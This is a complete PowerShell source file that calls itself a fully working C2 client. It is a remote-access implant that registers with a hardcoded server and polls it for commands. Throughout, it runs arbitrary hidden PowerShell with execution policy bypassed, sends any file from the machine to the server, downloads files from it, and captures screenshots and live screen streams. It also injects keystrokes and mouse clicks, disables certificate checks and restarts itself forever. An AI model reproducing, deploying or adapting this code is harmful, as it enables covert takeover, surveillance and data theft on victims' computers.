# client.ps1 - FULLY WORKING C2 Client with STREAMING + POLLING
# All commands: shell, screenshot, upload, download, stream, keyboard, mouse

$SERVER = "https://cpp-2-hsyk.onrender.com"
$CLIENT_ID = $null
$STREAMING = $false
$STREAM_INTERVAL_MS = 42  # ~24 FPS
$STREAM_TARGET_HEIGHT = 720  # HD 720p — lighter than 1080p, smooth at 24fps
$CURRENT_QUALITY = 55  # 55 = good HD quality without saturating uplink
$DPI_AWARE_SET = $false
$STREAM_FAILURES = 0
$MAX_STREAM_FAILURES = 30
$LOG_FILE = "$env:TEMP\client_debug.log"
$LAST_POLL_TIME = (Get-Date)
$POLL_INTERVAL = 2  # Poll every 2 seconds even during streaming

# SSL
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# Logging
function Write-Log {
    param($msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $msg" | Out-File -Append -FilePath $LOG_FILE
    Write-Host "[+] $msg"
}

# Register
# Sleep-resume safe: sends existing CLIENT_ID so the server keeps the SAME id
# after sleep (server deletes clients unseen for 60s). Retries FOREVER - never
# give up, because right after resume the network (WiFi/DHCP) may take a while.
# -DisableKeepAlive forces a fresh TCP connection every time, so we never hang
# on a dead pooled socket left over from before the sleep.
function Register-Client {
    while ($true) {
        try {
            $body = @{ id = $CLIENT_ID; public_ip = $env:USERPROFILE } | ConvertTo-Json
            $response = Invoke-WebRequest -Uri "$SERVER/api/register" -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 15 -DisableKeepAlive
            if ($response.StatusCode -eq 200) {
                $data = $response.Content | ConvertFrom-Json
                $script:CLIENT_ID = $data.id
                Write-Log "Registered: $CLIENT_ID"
                return $true
            }
        } catch { Write-Log "Register error: $_" }
        Start-Sleep -Seconds 5
    }
}

# Submit Result - never throws, truncates + strips bad chars so JSON never crashes
# Base64-fallback: if ConvertTo-Json chokes (many rapid outputs with weird unicode),
# we send output base64-encoded with b64:1 flag so server can decode.
function Submit-Result {
    param($cmdId, $output)
    try {
        if ($null -eq $output) { $output = "" }
        $output = "$output"
        if ($output.Length -gt 15000) { $output = $output.Substring(0, 15000) + "`n...[truncated]" }
        $output = $output -replace '[^\x09\x0A\x0D\x20-\uFFFF]','?'
        try {
            $body = @{ id = $CLIENT_ID; cmd_id = $cmdId; output = $output } | ConvertTo-Json -Compress -Depth 3 -ErrorAction Stop
        } catch {
            $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output))
            $body = @{ id = $CLIENT_ID; cmd_id = $cmdId; output = $b64; b64 = 1 } | ConvertTo-Json -Compress -Depth 3
        }
        Invoke-WebRequest -Uri "$SERVER/api/result" -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 10 -DisableKeepAlive | Out-Null
    } catch { Write-Log "Submit error: $($_.Exception.Message)" }
}

# Upload File
function Upload-File {
    param($cmdId, $fileStream, $filename)
    try {
        $boundary = "---------------------------$([System.Guid]::NewGuid().ToString('N'))"
        $body = [System.IO.MemoryStream]::new()
        $writer = New-Object System.IO.StreamWriter($body)
        
        $writer.WriteLine("--$boundary")
        $writer.WriteLine('Content-Disposition: form-data; name="id"')
        $writer.WriteLine()
        $writer.WriteLine($CLIENT_ID)
        if ($cmdId) {
            $writer.WriteLine("--$boundary")
            $writer.WriteLine('Content-Disposition: form-data; name="cmd_id"')
            $writer.WriteLine()
            $writer.WriteLine($cmdId)
        }
        $writer.WriteLine("--$boundary")
        $writer.WriteLine("Content-Disposition: form-data; name=`"file`"; filename=`"$filename`"")
        $writer.WriteLine("Content-Type: application/octet-stream")
        $writer.WriteLine()
        $writer.Flush()
        $fileStream.CopyTo($body)
        $fileStream.Dispose()
        $writer.WriteLine()
        $writer.WriteLine("--$boundary--")
        $writer.Flush()
        $body.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
        
        $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
        $response = Invoke-WebRequest -Uri "$SERVER/api/upload" -Method Post -Body $body -Headers $headers -UseBasicParsing -TimeoutSec 30 -DisableKeepAlive
        $body.Dispose(); $writer.Dispose()
        return $response.StatusCode -eq 200
    } catch {
        Write-Log "Upload error: $_"
        try { $body.Dispose() } catch { }
        try { $writer.Dispose() } catch { }
        try { $fileStream.Dispose() } catch { }
        return $false
    }
}

# 1. SHELL - sync in child process, base64-safe. First command works instantly,
# spam is capped server-side (queue 20) + client drains 1/poll, so no pileup.
# Admin may send plain text OR "b64:<base64utf8>".
# BLOCKLIST REMOVED - we now close child stdin so interactive cmds (more, pause,
# vim, ssh, ftp, nslookup) see EOF and exit instead of hanging the client.
$SHELL_TIMEOUT_SEC = 20
function Decode-ShellInput {
    param($cmd)
    if ($null -eq $cmd) { return "" }
    $cmd = "$cmd"
    if ($cmd.StartsWith("b64:")) {
        try { return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmd.Substring(4))) }
        catch { return "" }
    }
    return $cmd
}
function Execute-Shell {
    param($cmd)
    $cmd = Decode-ShellInput $cmd
    $cmd = "$cmd".Trim()
    try { $cwd = "$(Get-Location)" } catch { $cwd = "C:\" }
    if (-not $cmd) { return "$cwd> " }
    if ($cmd -match '^cd\s+(.+)$') {
        $path = $Matches[1].Trim('"').Trim("'")
        try { Set-Location $path; $cwd="$(Get-Location)"; return "$cwd> " } catch { return "cd: $($_.Exception.Message)`n$cwd> " }
        return "$cwd> "
    }
    $outFile = "$env:TEMP\sh_out_$([Guid]::NewGuid().ToString('N')).txt"
    $b64File = "$env:TEMP\sh_cmd_$([Guid]::NewGuid().ToString('N')).b64"
    $runnerFile = "$env:TEMP\sh_run_$([Guid]::NewGuid().ToString('N')).ps1"
    try {
        [IO.File]::WriteAllText($b64File, [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($cmd)))
        $runner = @'
$ErrorActionPreference='Continue'
$cwdIn = $args[0]; $b64File = $args[1]; $outFile = $args[2]
try { Set-Location $cwdIn } catch { }
try { $c = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([IO.File]::ReadAllText($b64File))) } catch { $c = "" }
try {
  $sb = [scriptblock]::Create($c)
  & $sb 2>&1 | Out-String -Width 200 | Out-File -FilePath $outFile -Encoding utf8
} catch {
  ("Parse/Runtime error: " + $_.Exception.Message) | Out-File -FilePath $outFile -Encoding utf8
}
try { ("`n" + (Get-Location).Path + "> ") | Out-File -Append -FilePath $outFile -Encoding utf8 } catch { }
'@
        [IO.File]::WriteAllText($runnerFile, $runner)
        $psi = New-Object Diagnostics.ProcessStartInfo
        $psi.FileName = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
        if (-not [IO.File]::Exists($psi.FileName)) { $psi.FileName = "powershell.exe" }
        $psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$runnerFile`" `"$cwd`" `"$b64File`" `"$outFile`""
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $psi.RedirectStandardInput = $true   # <-- so we can close child stdin
        $p = [Diagnostics.Process]::Start($psi)
        try { $p.StandardInput.Close() } catch { }   # EOF -> interactive cmds exit, never hang
        $waited = 0
        while (-not $p.HasExited -and $waited -lt ($SHELL_TIMEOUT_SEC*1000)) {
            Start-Sleep -Milliseconds 100; $waited += 100
        }
        if (-not $p.HasExited) {
            try { $p.Kill() } catch { }
            try { $p.WaitForExit(2000) } catch { }
            return "Command timed out after ${SHELL_TIMEOUT_SEC}s and was killed: $cmd`n$cwd> "
        }
        $result = ""
        if ([IO.File]::Exists($outFile)) { $result = [IO.File]::ReadAllText($outFile) }
        if ($null -eq $result) { $result = "" }
        # adopt child cwd (cd in subshell persists via last line)
        try {
            $lines = $result -split "`n"
            $lastLine = $lines[$lines.Length-1].Trim()
            if ($lastLine -match '^(.:\\.*)> ?$' -or $lastLine -match '^\\\\.*>$') {
                $newCwd = $lastLine.Substring(0, $lastLine.Length-1).Trim()
                if ($newCwd -and (Test-Path $newCwd)) { Set-Location $newCwd; $cwd="$(Get-Location)" }
            }
        } catch { }
        if ($result.Length -gt 12000) { $result = $result.Substring(0,12000) + "`n...[truncated]" }
        $result = $result -replace '[^\x09\x0A\x0D\x20-\uFFFF]','?'
        if (-not $result.EndsWith("> ")) { $result = "$result`n$cwd> " }
        return $result
    } catch {
        return "Error: $($_.Exception.Message)`n$cwd> "
    } finally {
        try { if ($outFile -and [IO.File]::Exists($outFile)) { [IO.File]::Delete($outFile) } } catch { }
        try { if ($b64File -and [IO.File]::Exists($b64File)) { [IO.File]::Delete($b64File) } } catch { }
        try { if ($runnerFile -and [IO.File]::Exists($runnerFile)) { [IO.File]::Delete($runnerFile) } } catch { }
    }
}
# 2. SCREENSHOT
function Take-Screenshot {
    param($quality = 60)
    try {
        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        try {
            Add-Type -Namespace Win32 -Name DPI2 -MemberDefinition '[System.Runtime.InteropServices.DllImport("user32.dll")] public static extern bool SetProcessDPIAware();' -ErrorAction SilentlyContinue
            [Win32.DPI2]::SetProcessDPIAware() | Out-Null
        } catch { }
        $vs = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap($vs.Width, $vs.Height)
        $g = [System.Drawing.Graphics]::FromImage($bitmap)
        $g.CopyFromScreen($vs.X, $vs.Y, 0, 0, $vs.Size)
        $g.Dispose()
        
        # Resize if too large
        if ($bitmap.Height -gt 1080) {
            $aspect = $bitmap.Width / $bitmap.Height
            $newWidth = [int](1080 * $aspect)
            $resized = New-Object System.Drawing.Bitmap($newWidth, 1080)
            $g2 = [System.Drawing.Graphics]::FromImage($resized)
            $g2.DrawImage($bitmap, 0, 0, $newWidth, 1080)
            $g2.Dispose()
            $bitmap.Dispose()
            $bitmap = $resized
        }
        
        $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" }
        $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
        $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, $quality)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, $jpegCodec, $encoderParams)
        $bitmap.Dispose()
        $ms.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
        return $ms
    } catch {
        Write-Log "Screenshot error: $_"
        return $null
    }
}

# 3. UPLOAD (client uploads file to server)
function Upload-File-From-Client {
    param($cmdId, $path)
    $path = $path.Trim('"').Trim("'")
    if (Test-Path $path) {
        $fs = [System.IO.File]::OpenRead($path)
        $name = [System.IO.Path]::GetFileName($path)
        Upload-File -cmdId $cmdId -fileStream $fs -filename $name
    } else {
        Submit-Result $cmdId "File not found: $path"
    }
}

# 4. DOWNLOAD (client downloads from server)
function Download-From-Server {
    param($cmdId, $filename)
    try {
        $url = "$SERVER/admin/download_file/$filename"
        $response = Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing -TimeoutSec 300 -DisableKeepAlive
        if ($response.StatusCode -eq 200) {
            $dest = "$env:USERPROFILE\Documents\$filename"
            [System.IO.File]::WriteAllBytes($dest, $response.Content)
            Submit-Result $cmdId "Downloaded to $dest"
        } else {
            Submit-Result $cmdId "Download failed: $($response.StatusCode)"
        }
    } catch { Submit-Result $cmdId "Download error: $_" }
}

# 5. KEYBOARD
function Send-Keyboard {
    param($cmdId, $params)
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        # Admin sends: "a", "enter", "backspace", "ctrl+c", "alt+f4", "shift+a", "a:press", etc.
        $key = $params
        $action = "type"
        if ($params -match "^(.*):(press|release)$") { $key = $Matches[1]; $action = $Matches[2] }

        # Map friendly names to SendKeys tokens
        $map = @{
            "enter" = "{ENTER}"; "return" = "{ENTER}"; "backspace" = "{BS}"; "bs" = "{BS}"
            "tab" = "{TAB}"; "escape" = "{ESC}"; "esc" = "{ESC}"; "space" = " "
            "up" = "{UP}"; "down" = "{DOWN}"; "left" = "{LEFT}"; "right" = "{RIGHT}"
            "delete" = "{DEL}"; "del" = "{DEL}"; "insert" = "{INS}"; "home" = "{HOME}"
            "end" = "{END}"; "pgup" = "{PGUP}"; "pgdn" = "{PGDN}"; "f1" = "{F1}"
            "f2" = "{F2}"; "f3" = "{F3}"; "f4" = "{F4}"; "f5" = "{F5}"; "f6" = "{F6}"
            "f7" = "{F7}"; "f8" = "{F8}"; "f9" = "{F9}"; "f10" = "{F10}"
            "f11" = "{F11}"; "f12" = "{F12}"
        }
        # ctrl+x / alt+x / shift+x combos
        if ($key -match "^(ctrl|control)\+(.+)$") {
            $inner = $Matches[2].ToLower()
            if ($map.ContainsKey($inner)) { $key = "^" + $map[$inner] } else { $key = "^$($Matches[2].ToLower())" }
        } elseif ($key -match "^alt\+(.+)$") {
            $inner = $Matches[1].ToLower()
            if ($map.ContainsKey($inner)) { $key = "%" + $map[$inner] } else { $key = "%$($Matches[1].ToLower())" }
        } elseif ($key -match "^shift\+(.+)$") {
            $inner = $Matches[1].ToLower()
            if ($map.ContainsKey($inner)) { $key = "+" + $map[$inner] } else { $key = "+$($Matches[1])" }
        } elseif ($map.ContainsKey($key.ToLower())) {
            $key = $map[$key.ToLower()]
        } elseif ($key.Length -eq 1) {
            # Escape SendKeys special chars: + ^ % ~ ( ) [ ] { }
            if ($key -match '[\+\^%~\(\)\[\]\{\}]') { $key = "{$key}" }
        } else {
            # Unknown multi-char name -> try as-is wrapped (e.g. "a" stays, "blah" sent literally)
            if ($key.Length -gt 1 -and -not $key.StartsWith("{")) { $key = "{$key}" }
        }

        switch ($action) {
            "press"   { Submit-Result $cmdId "Keyboard: hold not supported via SendKeys, typed $key"; [System.Windows.Forms.SendKeys]::SendWait($key) }
            "release" { Submit-Result $cmdId "Keyboard: release (noop) $key"; return }
            default   { [System.Windows.Forms.SendKeys]::SendWait($key) }
        }
        Submit-Result $cmdId "Keyboard: $params -> $key"
    } catch { Submit-Result $cmdId "Keyboard error: $_" }
}

# 6. MOUSE
Add-Type -Namespace Win32 -Name Mouse -MemberDefinition '[System.Runtime.InteropServices.DllImport("user32.dll")] public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);' -ErrorAction SilentlyContinue
function Send-Mouse {
    param($cmdId, $params)
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
        if ([string]::IsNullOrWhiteSpace("$params")) { Submit-Result $cmdId "Mouse error: empty params"; return }
        $parts = "$params" -split ":"
        if ($parts.Length -lt 2) { Submit-Result $cmdId "Mouse error: bad params '$params'"; return }
        try { $x = [int]([double]$parts[0]); $y = [int]([double]$parts[1]) }
        catch { Submit-Result $cmdId "Mouse error: bad coords '$params'"; return }
        $vs = [System.Windows.Forms.SystemInformation]::VirtualScreen
        if ($x -lt $vs.X) { $x = $vs.X }
        if ($y -lt $vs.Y) { $y = $vs.Y }
        if ($x -gt ($vs.X+$vs.Width-1)) { $x = $vs.X+$vs.Width-1 }
        if ($y -gt ($vs.Y+$vs.Height-1)) { $y = $vs.Y+$vs.Height-1 }
        $action = if ($parts.Length -gt 2) { $parts[2].ToLower() } else { "click" }
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
        Start-Sleep -Milliseconds 20
        switch ($action) {
            "click"      { [Win32.Mouse]::mouse_event(0x02, 0, 0, 0, 0); Start-Sleep -Milliseconds 20; [Win32.Mouse]::mouse_event(0x04, 0, 0, 0, 0) }
            "down"       { [Win32.Mouse]::mouse_event(0x02, 0, 0, 0, 0) }
            "up"         { [Win32.Mouse]::mouse_event(0x04, 0, 0, 0, 0) }
            "rightclick" { [Win32.Mouse]::mouse_event(0x08, 0, 0, 0, 0); Start-Sleep -Milliseconds 20; [Win32.Mouse]::mouse_event(0x10, 0, 0, 0, 0) }
            "rightdown"  { [Win32.Mouse]::mouse_event(0x08, 0, 0, 0, 0) }
            "rightup"    { [Win32.Mouse]::mouse_event(0x10, 0, 0, 0, 0) }
            "scroll" {
                $delta = 120
                if ($parts.Length -gt 3) { try { $delta = [int]($parts[3]) * 120 } catch { } }
                [Win32.Mouse]::mouse_event(0x0800, 0, 0, $delta, 0)
            }
            "move" { }
            default { [Win32.Mouse]::mouse_event(0x02, 0, 0, 0, 0); Start-Sleep -Milliseconds 20; [Win32.Mouse]::mouse_event(0x04, 0, 0, 0, 0) }
        }
        Submit-Result $cmdId "Mouse: ($x,$y) $action"
    } catch { Submit-Result $cmdId "Mouse error: $_" }
}

# 7. STREAMING FRAME - FULLSCREEN via VirtualScreen (fixes half-screen crop).
# Old code used PrimaryScreen.Bounds under DPI virtualization: on 125%/150%
# scaling CopyFromScreen got wrong coords -> half/black frames.
# Fix: SetProcessDPIAware FIRST (physical pixels), then capture
# SystemInformation.VirtualScreen (whole desktop, all monitors), downscale to 720p.
function Send-Stream-Frame {
    try {
        Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue

        if (-not $script:DPI_AWARE_SET) {
            try {
                Add-Type -Namespace Win32 -Name DPI -MemberDefinition '[System.Runtime.InteropServices.DllImport("user32.dll")] public static extern bool SetProcessDPIAware();' -ErrorAction Stop
                [Win32.DPI]::SetProcessDPIAware() | Out-Null
            } catch { }
            $script:DPI_AWARE_SET = $true
        }

        # Primary monitor only — VirtualScreen on multi-monitor / scaled displays
        # produces ultra-wide or half-cropped frames. PrimaryScreen = correct fullscreen.
        $vs = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap($vs.Width, $vs.Height)
        $g = [System.Drawing.Graphics]::FromImage($bitmap)
        $g.CopyFromScreen($vs.X, $vs.Y, 0, 0, $vs.Size)
        $g.Dispose()
        
        if ($bitmap.Height -gt $STREAM_TARGET_HEIGHT) {
            $aspect = $bitmap.Width / $bitmap.Height
            $newWidth = [int]($STREAM_TARGET_HEIGHT * $aspect)
            $resized = New-Object System.Drawing.Bitmap($newWidth, $STREAM_TARGET_HEIGHT)
            $g2 = [System.Drawing.Graphics]::FromImage($resized)
            $g2.DrawImage($bitmap, 0, 0, $newWidth, $STREAM_TARGET_HEIGHT)
            $g2.Dispose()
            $bitmap.Dispose()
            $bitmap = $resized
        }
        
        $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" }
        $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
        $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, $CURRENT_QUALITY)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, $jpegCodec, $encoderParams)
        $bitmap.Dispose()
        $ms.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
        
        # Upload frame
        $boundary = "---------------------------$([System.Guid]::NewGuid().ToString('N'))"
        $body = [System.IO.MemoryStream]::new()
        $writer = New-Object System.IO.StreamWriter($body)
        $writer.WriteLine("--$boundary")
        $writer.WriteLine('Content-Disposition: form-data; name="id"')
        $writer.WriteLine(); $writer.WriteLine($CLIENT_ID)
        $writer.WriteLine("--$boundary")
        $writer.WriteLine('Content-Disposition: form-data; name="is_stream_frame"')
        $writer.WriteLine(); $writer.WriteLine("true")
        $writer.WriteLine("--$boundary")
        $writer.WriteLine("Content-Disposition: form-data; name=`"file`"; filename=`"frame.jpg`"")
        $writer.WriteLine("Content-Type: image/jpeg")
        $writer.WriteLine(); $writer.Flush()
        $ms.CopyTo($body); $ms.Dispose()
        $writer.WriteLine(); $writer.WriteLine("--$boundary--"); $writer.Flush()
        $body.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
        
        $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
        Invoke-WebRequest -Uri "$SERVER/api/upload" -Method Post -Body $body -Headers $headers -UseBasicParsing -TimeoutSec 5 -DisableKeepAlive | Out-Null
        $body.Dispose(); $writer.Dispose()
        
        $script:STREAM_FAILURES = 0
        return $true
    } catch {
        $script:STREAM_FAILURES++
        if ($STREAM_FAILURES -ge $MAX_STREAM_FAILURES) {
            $script:STREAMING = $false
            Write-Log "Stream stopped due to failures"
        }
        return $false
    }
}

# 8. PROCESS COMMAND — wrapped so one bad command can NEVER kill the client
function Process-Command {
    param($cmd)
    
    try {
    $cmdId = $cmd.id
    $type = $cmd.type
    $params = $cmd.params
    if ($null -eq $params) { $params = "" }
    
    Write-Log "Command: $type - $params"
    
    switch ($type) {
        "shell" {
            $result = Execute-Shell $params
            Submit-Result $cmdId $result
        }
        "screenshot" {
            $buf = Take-Screenshot -quality 85
            if ($buf) {
                Upload-File -cmdId $cmdId -fileStream $buf -filename "screenshot.jpg"
            } else {
                Submit-Result $cmdId "Screenshot failed"
            }
        }
        "upload" {
            Upload-File-From-Client $cmdId $params
        }
        "download" {
            Download-From-Server $cmdId $params
        }
        "start_stream" {
            $script:STREAMING = $true
            $script:STREAM_FAILURES = 0
            Submit-Result $cmdId "Streaming started (1080p full-screen)"
        }
        "stop_stream" {
            $script:STREAMING = $false
            $script:STREAM_FAILURES = 0
            Submit-Result $cmdId "Streaming stopped"
        }
        "keyboard" {
            Send-Keyboard $cmdId $params
        }
        "mouse" {
            Send-Mouse $cmdId $params
        }
        default {
            Submit-Result $cmdId "Unknown command: $type"
        }
    }
    } catch {
        try { Submit-Result $cmd.id "Command crashed but client alive: $_" } catch { }
        Write-Log "Process-Command guarded crash: $_"
    }
}

# 9. POLL LOOP WITH INTERLEAVED STREAMING
function Poll-Loop {
    $failures = 0
    $frameCount = 0
    Write-Log "Poll loop started"

    function Poll-Once {
        try {
            $body = @{ id = $script:CLIENT_ID } | ConvertTo-Json
            # Drain queue but MAX 2 per poll: shell is now async so we can take
            # more, but unbounded drain + spam still stacks jobs -> cap it.
            $n = 0
            while ($n -lt 2) {
                $response = Invoke-WebRequest -Uri "$SERVER/api/poll" -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 8 -DisableKeepAlive
                if ($response.StatusCode -ne 200) { return $false }
                $data = $response.Content | ConvertFrom-Json
                if ($data.command) {
                    try { Process-Command $data.command } catch { Write-Log "Cmd crash guarded: $_" }
                    $n++
                } else { break }
            }
            return $true
        } catch {
            if ("$_" -match "404") {
                Write-Log "Server forgot us (404), re-registering..."
                Register-Client | Out-Null
                return $true
            }
            Write-Log "Poll error: $_"
            return $false
        }
    }
    
    while ($true) {
        # If streaming is active, send a frame
        if ($STREAMING) {
            try { Send-Stream-Frame } catch { Write-Log "Frame crash guarded: $_" }
            $frameCount++
            
            # Poll EVERY frame (cheap JSON call) so mouse/keyboard feel instant.
            # Old code polled every 5th frame = up to 0.5s+ input lag + disconnect feeling.
            if (-not (Poll-Once)) {
                $failures++
                if ($failures -gt 5) {
                    Write-Log "Poll error streak during stream, re-registering..."
                    $failures = 0
                    Register-Client | Out-Null
                }
            } else { $failures = 0 }
            
            Start-Sleep -Milliseconds $STREAM_INTERVAL_MS
        } else {
            # Normal polling when not streaming
            try {
                $body = @{ id = $CLIENT_ID } | ConvertTo-Json
                $response = Invoke-WebRequest -Uri "$SERVER/api/poll" -Method Post -Body $body -ContentType "application/json" -UseBasicParsing -TimeoutSec 15 -DisableKeepAlive
                
                if ($response.StatusCode -eq 200) {
                    $data = $response.Content | ConvertFrom-Json
                    if ($data.command) {
                        Process-Command $data.command
                    }
                    $failures = 0
                } elseif ($response.StatusCode -eq 404) {
                    Write-Log "Re-registering..."
                    Register-Client
                    Start-Sleep -Seconds 10
                } else {
                    $failures++
                }
            } catch {
                $failures++
                Write-Log "Poll error: $_"
                # NOTE: Invoke-WebRequest THROWS on HTTP errors (404 etc),
                # so a 404 never reaches the elseif above - it lands here.
                if ("$_" -match "404") {
                    Write-Log "Server forgot us (404), re-registering..."
                    $failures = 0
                    Register-Client | Out-Null
                } elseif ($failures -gt 3) {
                    Write-Log "Poll failing, re-registering..."
                    $failures = 0
                    Register-Client | Out-Null
                }
            }
            
            # Backoff
            $interval = 1
            if ($failures -gt 3) {
                $interval = [Math]::Min(1 * [Math]::Pow(2, $failures - 3), 60)
            }
            Start-Sleep -Seconds $interval
        }
    }
}

# 10. MAIN
# Never exits: after sleep the network can take a minute to come back, so
# Register-Client already retries forever and Poll-Loop re-registers on 404.
function Main {
    Write-Log "=== Client Starting ==="

    # Wait for the network to be usable (critical right after sleep/resume,
    # when WiFi/DHCP is still reconnecting). Pure TCP check - creates no
    # junk entries on the server. Fast (one pass) when network is fine.
    try {
        $uri = New-Object System.Uri($SERVER)
        $port = $uri.Port
        if ($port -eq -1) { if ($uri.Scheme -eq "https") { $port = 443 } else { $port = 80 } }
        $netWait = 0
        while ($netWait -lt 24) {
            try {
                $tcp = New-Object System.Net.Sockets.TcpClient
                $iar = $tcp.BeginConnect($uri.Host, $port, $null, $null)
                if ($iar.AsyncWaitHandle.WaitOne(4000)) { $tcp.EndConnect($iar); $tcp.Close(); break }
                $tcp.Close()
            } catch { }
            $netWait++
            Start-Sleep -Seconds 5
        }
    } catch { }

    # Register (retries forever internally - never returns $false)
    Register-Client | Out-Null

    # Start poll loop
    Poll-Loop
}

# ENTRY
while ($true) {
    try {
        Main
    } catch {
        Write-Log "Crash: $_"
        Start-Sleep -Seconds 5
    }
}
